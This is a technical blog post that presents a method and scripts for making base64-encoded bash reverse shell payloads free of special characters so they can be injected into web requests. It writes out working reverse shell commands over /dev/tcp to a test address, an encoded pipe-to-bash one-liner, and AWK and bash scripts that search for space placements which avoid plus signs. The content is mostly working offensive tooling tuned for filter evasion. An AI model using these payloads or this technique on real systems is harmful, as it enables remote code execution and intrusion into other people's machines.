+++
title = 'Script to Optimize Alphanumeric Base64 for Reverse Shell Payloads'
date = 2023-11-24T16:43:52-06:00
draft = false
+++

# Description of the Problem
when trying a reverse shell payload, you want to remove as many variables as possible.
often it must be injected in the middle of a series of broken quotes or special characters.
it would be beneficial to remove as many special characters as possible.

base64 consists of an alphabet of uppercase, lowercase, numbers, and special symbols like plus signs.
these speical characters have meaning in web payloads, where form encoding or json special characters may mean you have to alter your payload to work properly in the context where you paste it.

- example reverse shell payload for testing in a docker that generates plus signs in its base64
```bash
echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzkwMDEgMD4mMScK
```

## Optimizing Base64
If we optimize the base64, we could remove all special characters by altering the payload such that it returns only alphanumeric characters.
One way to do this is by adding spaces. The best place to add spaces is where there are already spaces in a payload.
Usually, there is some combination of spaces which will push the characters into positions in the byte string in which they do not need any special characters to be reresented in the base64 string.
The resulting payload should be free of any special characters except for any pipe characters and spaces that are absolutely necessary.

- optimized base64 payload
```bash
echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS85MDAxICAwPiYx|base64 -d|bash
```
- decoding the payload
```bash
echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS85MDAxICAwPiYx|base64 -d
bash -i  >& /dev/tcp/172.17.0.1/9001  0>&1
```
As you can see, spaces have been inserted in two locations in order to move the characters around to specific locations.

## The Algorithm

How can this be done?
The easiest algorithm to implement is to just start trying all possibilities of spaces inserted until one converts to alphanumeric base64.
I have [implemented such an algorithm in bash and awk](https://github.com/nicholas-long/environment/blob/main/zet/20230906035744/README.md).
I use this script within the [shortcut command in my environment for creating reverse shell snippets](https://github.com/nicholas-long/environment/blob/main/zet/20230906035650/README.md)

A walkthrough of the script to produce all possible space combinations is implemented below in AWK.

```awk
#!/usr/bin/awk -f
# print all variations of spaces between tokens
function expand_rec(str, pos) {
  if (pos > NF) { # recursion base case - end of char array
    printf("%s\n", str "")
    return
  } else {
    expand_rec(str " " $pos, pos + 1)
    expand_rec(str "  " $pos, pos + 1)
    expand_rec(str "   " $pos, pos + 1)
    expand_rec(str "    " $pos, pos + 1)
  }
}
{
  expand_rec("", 1)
}
```
I call this script "space invader". It uses recursion to produce all variations of spaces.
The goal of this script is to have it run until the output buffer is closed because a solution has been found.

A simple bash script wrapped around it can base64 encode every line until a solution is found.
```bash
#!/bin/bash
# find alphanumeric base64 using awk script
echo "$1" | $ENVIRON_BASEPATH/zet/20230906035744/space-invader | while read line; do
  echo -n "$line" | base64 -w0
  echo ""
done | grep '^[A-Za-z0-9]*$' | head -n 1
```
